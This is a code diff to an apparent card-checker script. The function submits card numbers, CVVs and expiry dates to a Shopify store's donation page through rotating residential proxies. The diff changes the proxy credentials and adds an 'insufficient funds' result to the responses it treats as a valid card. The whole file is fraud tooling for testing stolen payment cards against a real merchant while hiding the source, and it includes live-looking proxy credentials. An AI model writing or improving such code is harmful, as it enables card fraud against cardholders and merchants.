@@ -10,7 +10,7 @@ async def shopify_func(_, cc, cvv, mes, ano):
             "card": fullcc,
             "product_url": "https://wcbbstore.com/products/donate",
             "email": None,
-            "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
+            "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
             "ship_address": None,
             "is_shippable": False
         }
@@ -28,29 +28,20 @@ async def shopify_func(_, cc, cvv, mes, ano):
 
             if status == "processedreceipt":
                 if "fail" in cvc:
-                    return {
-                        "status": "Approved ✅",
-                        "response": "CVC MISMATCH"
-                    }
+                    return {"status": "Approved ✅", "response": "INCORRECT_CVC"}
                 elif "incorrect_zip" in message or "fail" in avs:
-                    return {
-                        "status": "Approved ✅",
-                        "response": "INCORRECT_ZIP"
-                    }
+                    return {"status": "Approved ✅", "response": "INCORRECT_ZIP"}
                 else:
-                    return {
-                        "status": "Approved ✅",
-                        "response": response.get("message", "Charged successfully")
-                    }
+                    return {"status": "Approved ✅", "response": response.get("message", "Charged successfully")}
+
+            elif "insufficient" in message:
+                return {"status": "Approved ✅", "response": "INSUFFICIENT FUNDS"}
 
             else:
                 return {
                     "status": "Declined ❌",
-                    "response": response.get("error", "Declined or unexpected error")
+                    "response": response.get("error", message or "Declined or unexpected error")
                 }
 
     except Exception as e:
-        return {
-            "status": "Error",
-            "response": f"Request failed: {e}"
-        }
+        return {"status": "Error", "response": f"Request failed: {e}"}
